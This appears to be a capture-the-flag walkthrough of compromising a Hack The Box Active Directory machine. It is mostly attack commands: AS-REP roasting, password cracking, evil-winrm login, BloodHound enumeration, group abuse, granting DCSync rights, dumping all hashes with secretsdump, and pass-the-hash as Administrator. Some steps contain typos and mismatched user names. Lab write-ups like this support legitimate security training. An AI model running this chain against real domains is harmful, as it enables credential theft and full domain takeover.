we add the machine to /etc/hosts:

	10.10.10.161    HTB

we started by enumerating the target machine with nmap:

	nmap -p- 10.10.10.161

output:

	53/tcp    open  domain
	88/tcp    open  kerberos-sec
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	389/tcp   open  ldap
	445/tcp   open  microsoft-ds
	464/tcp   open  kpasswd5
	593/tcp   open  http-rpc-epmap
	636/tcp   open  ldapssl
	3268/tcp  open  globalcatLDAP
	3269/tcp  open  globalcatLDAPssl
	5985/tcp  open  wsman
	9389/tcp  open  adws
	47001/tcp open  winrm

there is open Kerberos, LDAP Winrm it's importa for connection to the machine.
then we run enum4linux against the target machine:

	emux4linux 10.10.10.161

output:

	user:[Administrator] rid:[0x1f4]
	user:[Guest] rid:[0x1f5]
	user:[krbtgt] rid:[0x1f6]
	user:[DefaultAccount] rid:[0x1f7]
	user:[sebastien] rid:[0x479]
	user:[lucinda] rid:[0x47a]
	user:[svc-alfresco] rid:[0x47b]
	user:[andy] rid:[0x47e]
	user:[mark] rid:[0x47f]
	user:[santi] rid:[0x480]
	user:[miku] rid:[0x2581]
	user:[tester1] rid:[0x2582]
	user:[tester3] rid:[0x2583]
	user:[tester4] rid:[0x2584]

it has done a rid-brute without use CME, so this time i try so search some users with the DON_REQUIRE_PREAUTH flag fo kerberos 

	impacket-GetNPUsers HTB/svc-alfresco -no-pass

output:

	Getting TGT for svc-alfresco
	$krb5asrep$23$svc-alfresco@HTB:<REDACTED>

now it's time to use john and crack it with the followin command:

	nano hash /We paste the TGT/
	john hash -w=/usr/share/wordlists/rockyou.txt

Now we have the password and we can neter with Evil-Winrm with the following command:

	evil-winrm -i HTB -u svc-alfresco -p S3rvice 

we're in and we can retrieve the user.txt.
now it's time to use bloodhund (we skip the setup part, you can search on internet), we upload the sharphound on the target machine, on the kali we turn on neo4j and bloodhund 

	upload sharphound.ps1 C:\Windows\Tasks\sharp.ps1
	. .\sharp.ps1
	Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Windows\Tasks"

we receive a .zip to download on kali and we insert in bloodhund, in bloodhund we search the user _"SVC-ALFRESCO@HTB.LOCAL"_ and the group _"DOMAIN CONTROLLERS@HTB.LOCAL"_, we can see that we have writeDACL, in short terms we can modift the access-control lists with the following commands:

Windows machine:

	$pw = "tester1234" | ConvertTo-SecureString -AsPlainText -Force
	new-localUser tester1 -Password $pw -FullName "tester" -Description "tester"
	net localgroup "Remote Management Users" /add tester3
	net group "Exchange Windows Permissions" /add tester3
	net user tester3

kali machine:

	evil-winrm -u tester3 -p tester1234 -i HTB 

we enter and we upload powerview, because we want to use the command _Add-DomainObjectAcl_ to add a new object to DACL that it has DYSnc right in order to retrieve the Administrator NTLM Hash

	upload /home/kali/Downloads/PowerView.ps1 C:\Windows\Tasks\pw.ps1
	import-module .\pw.ps1
    Add-DomainObjectAcl -TargetIdentity "DC=htb, DC=local"  -PrincipalIdentity tester3  -Rights DCSync -verbose

Now with this command we retrieve the NTLM hash of all Users but in particular of the Administrator:

    impacket-secretsdump -dc-ip 10.10.10.161 tester3:tester1234@10.10.10.161

we logon:

	evil-winrm -i HTB -u Administrator -H <REDACTED>

we're in and we can retrieve the root flag.
